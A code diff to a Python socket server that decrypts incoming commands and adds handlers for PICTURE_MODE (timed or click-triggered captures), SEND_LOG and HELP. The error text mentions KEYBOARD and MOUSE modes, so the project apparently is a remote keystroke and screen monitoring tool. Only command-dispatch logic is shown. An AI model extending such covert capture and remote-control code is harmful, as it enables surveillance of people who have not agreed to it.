@@ -36,7 +36,7 @@ class Server_subprocess:
                         encrypted_data = conn.recv(1024)
                         if not encrypted_data:
                             break
-                        data = await decrypt_message(encrypted_data, self.key)
+                        data = decrypt_message(encrypted_data, self.key)
 
                         #Debug data sender
                         # print(b"[ SERVER ] : Data receive '{}'.".format(data))
@@ -152,6 +152,8 @@ class Server_subprocess:
                                 elif index == 19: #MOVE ##################### SETUP RETURN > give path
                                     result = "PONG ! From {} IP : {}.".format(self.name,self.ip)
                                     print(printable)
+                                    
+                                ####### - PICTURE_MODE - #######
                                 elif index == 20:
                                     result = "Incomplete or invalid command e.g : PICTURE_MODE [TIMER/CLICK] 10(secondes / clicks RECOMMANDED 50)"
                                     if not data_array[1].upper() in ["TIMER","CLICK"]:raise Exception("Error, the first argument must be KEYBOARD, MOUSE or PICTURE")#Check argument if is integer
@@ -166,7 +168,14 @@ class Server_subprocess:
                                             result = "Task '{}' found, description : {}. For {} IP : {}. Timer is setup on mode {} - {} every secondes.".format(task,printable["description"],self.name,self.ip,data_array[1],data_array[2])
                                         
                                         print(printable)
-                                elif index == 21:
+                                        
+                                ####### - SEND_LOG - #######
+                                elif index == 21: #MOVE ##################### SETUP RETURN > give path
+                                    result = "All logs are on log folder"
+                                    print(printable)
+                                    
+                                ####### - HELP - #######
+                                elif index == 22:
                                     result = "Help commande :\n{}".format(printable["description"])
                                     print(printable)
                         except Exception:
